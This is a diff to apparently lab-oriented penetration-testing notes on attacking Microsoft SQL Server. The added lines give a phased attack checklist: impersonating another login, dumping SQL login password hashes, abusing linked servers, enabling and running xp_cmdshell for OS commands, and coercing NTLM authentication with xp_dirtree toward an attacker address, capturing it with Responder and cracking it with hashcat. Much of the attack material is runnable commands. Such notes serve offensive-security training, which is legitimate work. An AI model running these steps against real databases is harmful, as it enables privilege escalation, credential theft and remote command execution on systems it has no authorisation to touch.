@@ -41,13 +41,13 @@ Microsoft SQL Server is a relational database management system developed by Mic
 
 MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server.
 
-|Default System Database|Description|
-|---|---|
-|`master`|Tracks all system information for an SQL server instance|
-|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
-|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
-|`tempdb`|Stores temporary objects|
-|`resource`|Read-only database containing system objects included with SQL server|
+| Default System Database | Description                                                                                                                                                                                            |
+| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `master`                | Tracks all system information for an SQL server instance                                                                                                                                               |
+| `model`                 | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
+| `msdb`                  | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
+| `tempdb`                | Stores temporary objects                                                                                                                                                                               |
+| `resource`              | Read-only database containing system objects included with SQL server                                                                                                                                  |
 
 Table source: [System Databases Microsoft Doc](https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15) and HTB Academy
 
@@ -192,6 +192,20 @@ select @@version;
 select user_name()
 go 
 
+#####################
+# To enumerate privs from user
+SQL (kevin  guest@master)> enum_impersonate
+
+Output:
+-----
+execute as   database   permission_name   state_desc   grantee   grantor   
+----------   --------   ---------------   ----------   -------   -------   
+LOGIN                   IMPERSONATE       GRANT        kevin     appdev    
+
+# And then impersonate with:
+EXECUTE AS LOGIN = 'appdev';
+
+
 # We need to use GO after our query to execute the SQL syntax. 
 # List databases
 SELECT name FROM master.dbo.sysdatabases
@@ -242,6 +256,143 @@ SELECT * FROM offsec.information_schema.tables;
 
 # Following the example, now we saw the table users (in the database offsec), and we want to see their records:
 select * from offsec.dbo.users;
+
+#################
+# RECON
+###################
+# Identify MSSQL version, OS version, and patch level to understand the environment and possible vulnerabilities.
+SELECT @@version;
+
+# Get the hostname of the SQL server to map it with domain infrastructure.
+SELECT @@servername;
+
+# Confirm the current login (e.g., OVERWATCH\sqlsvc) to understand privilege level.
+SELECT SYSTEM_USER;
+
+#  Shows database-level user identity.
+SELECT USER_NAME();
+
+#  Shows the client machine name connected to MSSQL.
+SELECT HOST_NAME();
+
+# Displays the current database in use.
+SELECT DB_NAME(); 
+
+#  Checks if the current user has sysadmin privileges.
+SELECT IS_SRVROLEMEMBER('sysadmin'); 
+
+# Confirms default role membership.
+SELECT IS_SRVROLEMEMBER('public');
+
+#####################
+# ## Phase 2 — Permission & Role Enumeration
+####################
+# Lists all server-level permissions of the current user.
+SELECT * FROM fn_my_permissions(NULL, 'SERVER');
+
+#  Lists all SQL and Windows logins in the server.  
+SELECT name, type_desc FROM sys.server_principals;
+
+#  Shows permissions granted to users and roles.  
+SELECT * FROM sys.server_permissions;
+
+#  Extracts SQL login hashes if accessible.  
+SELECT name, password_hash FROM sys.sql_logins; 
+
+# Lists database-level users.  
+SELECT * FROM sys.database_principals; 
+
+#  Shows database permissions.
+SELECT * FROM sys.database_permissions; 
+
+
+############################
+# ## Phase 3 — Database Enumeration
+############################
+SELECT name FROM sys.databases; : Lists all available databases (master, msdb, overwatch, etc.).  
+USE overwatch; : Switch to application database.  
+SELECT name FROM sys.tables; : Lists all tables in the overwatch database.  
+SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; : Alternative table enumeration.  
+
+# Lists all columns in all tables.  
+SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS; 
+
+SELECT TOP 50 * FROM <tablename>; : Dumps first 50 rows from Eventlog table.
+
+
+##############################
+# Phase 4 — System Database Enumeration
+#############################
+SELECT name FROM msdb.sys.tables; : Lists tables in msdb (jobs, backups, credentials).  
+SELECT * FROM msdb.dbo.sysjobs; : Lists scheduled SQL jobs.  
+SELECT * FROM msdb.dbo.backupset; : Shows backup history and file paths.  
+SELECT * FROM master.sys.databases; : Lists system databases again with metadata.  
+SELECT * FROM master.sys.syslogins; : Shows system logins.
+
+
+
+###############################
+# Phase 5 — Linked Server Discovery (Critical for Overwatch)
+##############################
+# Lists all linked SQL servers.
+EXEC sp_linkedservers; 
+
+# Shows linked server configuration (RPC, data access, etc.).
+SELECT * FROM sys.servers; 
+
+# Displays server and linked server information.
+EXEC sp_helpserver; 
+
+# Shows linked server login mappings.
+EXEC sp_helplinkedsrvlogin; 
+
+# Displays linked server credential mapping.
+SELECT * FROM sys.linked_logins; 
+
+
+###################################
+# Phase 6— Linked Server Testing
+###################################
+# Test connection to linked server SQL07.
+EXEC ('SELECT @@version') AT SQL07; 
+
+# Alternative query to linked server.
+SELECT * FROM OPENQUERY(SQL07,'SELECT @@version'); 
+
+# Check authentication on linked server.
+EXEC ('SELECT SYSTEM_USER') AT SQL07; 
+
+#  Enumerate remote databases.
+EXEC ('SELECT name FROM master.sys.databases') AT SQL07; 
+
+
+####################################
+# Phase 7— Command Execution Checks
+###################################
+#  Test OS command execution.
+EXEC xp_cmdshell 'whoami'; 
+EXEC sp_configure'show advanced options',1; RECONFIGUR E; : Enable advanced SQL options.
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGUR E; : Enable xp_cmdshell.
+EXEC xp_cmdshell 'ipconfig'; : Check network configuration.
+EXEC xp_cmdshell 'hostname'; : Get system hostname.
+
+
+##################################
+# Phase 8— SQL Server Services & Configuration
+###################################
+EXEC sp_configure; : Lists SQL server configuration settings.
+SELECT servicename, service_account FROM sys.dm_server_services; : Shows SQL service account.
+SELECT * FROM sys.dm_exec_connections; : Lists active connections.
+SELECT * FROM sys.dm_exec_sessions; : Shows current sessions.
+
+
+###################################
+# Phase 9— Domain & Network Information
+##################################
+SELECT name FROM sys.server_principals WHERE type_desc='WINDOWS_LOGIN'; : Lists AD users connected to SQL.  
+SELECT * FROM sys.remote_logins; : Shows remote authentication settings.  
+SELECT * FROM sys.credentials; : Lists stored credentials.  
+SELECT * FROM sys.endpoints; : Shows SQL network endpoints.
 
 ```
 
@@ -381,4 +532,57 @@ With this feature enabled, we can execute any Windows shell command through the�
 ```sql
 EXECUTE xp_cmdshell 'whoami';
 ```
+
+## NTML relay
+
+Once you access to a database:
+
+```
+xp_dirtree \\10.10.15.203\shared
+```
+
+have the responder ready to capture the hash:
+
+```
+sudo responder -w -d -I tun0  
+```
+
+Crack the hash:
+
+```
+hashcat -m 5600 hashes.txt  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+## Stored procedures
+
+In Microsoft SQL Server, stored procedures that start with `xp_` are known as extended stored procedures. These procedures are special because they provide an interface between SQL Server and external components or operating system services. Here are some similar stored procedures that start with `xp_`, along with brief explanations of their purposes:
+
+####  1. `xp_fixeddrives`
+
+- **Purpose:** Returns information about the disk drives on the server.
+- **Example:** `EXEC xp_fixeddrives;`
+
+### 2. `xp_regread` and `xp_regwrite`
+
+- **Purpose:** Read from and write to the Windows registry from within SQL Server.
+- **Examples:**
+    - `EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\MyApp', 'Version';`
+    - `EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\MyApp', 'Version', '1.0';`
+
+### 3. `xp_fileexist` and `xp_filesize`
+
+- **Purpose:** Checks if a file exists and returns its size, respectively.
+- **Examples:**
+    - `EXEC xp_fileexist 'C:\MyFile.txt';`
+    - `EXEC xp_filesize 'C:\MyFile.txt';`
+
+### 4. `xp_dirtree`
+
+- **Purpose:** Generates a hierarchical listing of files and directories within a specified directory on the file system
+- **Example:** `EXEC xp_dirtree 'C:\MyDirectory\', 1;`
+
+### 5. `xp_cmdshell`
+
+- **Purpose:** Executes operating system commands from within SQL Server.
+- **Example:** `EXEC xp_cmdshell 'dir C:\';`
 
